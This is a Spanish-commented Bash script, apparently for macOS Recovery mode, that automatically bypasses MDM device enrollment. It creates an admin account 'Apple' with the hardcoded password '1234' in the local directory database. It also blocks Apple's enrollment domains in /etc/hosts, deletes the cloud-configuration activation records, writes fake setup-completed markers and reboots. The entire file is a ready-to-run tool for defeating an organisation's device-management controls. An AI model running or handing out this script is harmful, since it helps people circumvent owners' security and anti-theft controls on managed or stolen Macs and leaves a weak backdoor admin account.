#!/bin/bash

# ==============================================================================
# Bypass MDM - 100% Automático (Basado en v3 que SÍ funciona)
# ==============================================================================

RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

error_exit() { echo -e "${RED}ERROR: $1${NC}" >&2; exit 1; }
warn()       { echo -e "${YEL}WARNING: $1${NC}"; }
success()    { echo -e "${GRN}✓ $1${NC}"; }
info()       { echo -e "${BLU}ℹ $1${NC}"; }

# ==============================================================================
# DETECCIÓN DE VOLÚMENES
# ==============================================================================
detect_volumes() {
	local system_vol=""
	local data_vol=""

	info "Detectando volúmenes..." >&2

	for vol in /Volumes/*; do
		if [[ "$vol" == *"Base System"* ]] || [[ "$vol" == *"Recovery"* ]]; then
			continue
		fi
		
		if [ -d "$vol/System/Library" ]; then
			system_vol=$(basename "$vol")
		fi
		
		if [ -d "$vol/private/var/db/dslocal" ]; then
			data_vol=$(basename "$vol")
		fi
	done

	if [ -z "$system_vol" ]; then
		error_exit "No se pudo detectar el volumen del sistema."
	fi

	if [ -z "$data_vol" ]; then
		error_exit "No se pudo detectar el volumen de datos."
	fi

	echo "$system_vol|$data_vol"
}

# ==============================================================================
# INICIO AUTOMÁTICO
# ==============================================================================

volume_info=$(detect_volumes)
system_volume=$(echo "$volume_info" | cut -d'|' -f1)
data_volume=$(echo "$volume_info" | cut -d'|' -f2)

clear
echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  Bypass MDM - Automático (Sin preguntas)      ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════╝${NC}"
echo ""
success "Volumen Sistema: $system_volume"
success "Volumen Datos:   $data_volume"
echo ""

echo -e "${YEL}═══════════════════════════════════════${NC}"
echo -e "${YEL}  Iniciando Proceso de Bypass MDM${NC}"
echo -e "${YEL}═══════════════════════════════════════${NC}"
echo ""

system_path="/Volumes/$system_volume"
data_path="/Volumes/$data_volume"
dscl_path="$data_path/private/var/db/dslocal/nodes/Default"

[ -d "$system_path" ] || error_exit "Ruta del sistema no existe: $system_path"
[ -d "$data_path" ]   || error_exit "Ruta de datos no existe: $data_path"
[ -d "$dscl_path" ]   || error_exit "Base de datos no existe: $dscl_path"
success "Rutas validadas"; echo

# --- VALORES AUTOMÁTICOS (Sin preguntar) ---
realName="Apple"
username="Apple"
passw="1234"

info "Usando valores automáticos: Usuario='$username', Contraseña='$passw'"
echo ""

# --- Buscar UID ---
info "Buscando UID disponible..."
available_uid=501
while [ $available_uid -lt 600 ]; do
	if ! dscl -f "$dscl_path" localhost -search /Local/Default/Users UniqueID $available_uid 2>/dev/null | grep -q "UniqueID"; then
		break
	fi
	available_uid=$((available_uid + 1))
done
success "Usando UID: $available_uid"; echo

# --- Crear la cuenta ---
info "Creando cuenta: $username"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" || error_exit "Error al crear usuario"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "$available_uid"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"

user_home="$data_path/Users/$username"
mkdir -p "$user_home" || error_exit "Error al crear carpeta home"

dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw" || error_exit "Error al asignar contraseña"
dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership "$username" || error_exit "Error al añadir a admin"
success "Cuenta creada correctamente"; echo

# --- Bloquear Dominios ---
info "Bloqueando dominios MDM..."
hosts_file="$system_path/etc/hosts"
[ -f "$hosts_file" ] || touch "$hosts_file"
grep -q "deviceenrollment.apple.com" "$hosts_file" || echo "0.0.0.0 deviceenrollment.apple.com" >> "$hosts_file"
grep -q "mdmenrollment.apple.com" "$hosts_file" || echo "0.0.0.0 mdmenrollment.apple.com" >> "$hosts_file"
grep -q "iprofiles.apple.com" "$hosts_file" || echo "0.0.0.0 iprofiles.apple.com" >> "$hosts_file"
success "Dominios bloqueados"; echo

# --- Configuración MDM ---
info "Configurando ajustes de bypass..."
config_path="$system_path/var/db/ConfigurationProfiles/Settings"
mkdir -p "$config_path"

touch "$data_path/private/var/db/.AppleSetupDone" && success "Setup marcado como completo" || warn "No se pudo marcar Setup"
rm -rf "$config_path/.cloudConfigHasActivationRecord" && success "Registro de activación eliminado" || info "No había registro de activación"
rm -rf "$config_path/.cloudConfigRecordFound" && success "Registro de configuración eliminado" || info "No había registro de configuración"
touch "$config_path/.cloudConfigProfileInstalled" && success "Marcador de perfil instalado creado" || warn "No se pudo crear marcador de perfil"
touch "$config_path/.cloudConfigRecordNotFound" && success "Marcador de registro no encontrado creado" || warn "No se pudo crear marcador de no encontrado"
echo ""

echo -e "${GRN}╔═══════════════════════════════════════════════╗${NC}"
echo -e "${GRN}║       ¡BYPASS MDM COMPLETADO!                 ║${NC}"
echo -e "${GRN}╚═══════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Siguientes pasos:${NC}"
echo "  1. Cierra esta terminal"
echo "  2. Reinicia tu Mac"
echo -e "  3. Entra con usuario: ${YEL}$username${NC} y contraseña: ${YEL}$passw${NC}"
echo ""

# Pausa final para que puedas leer el mensaje antes de que se reinicie
sleep 5
reboot
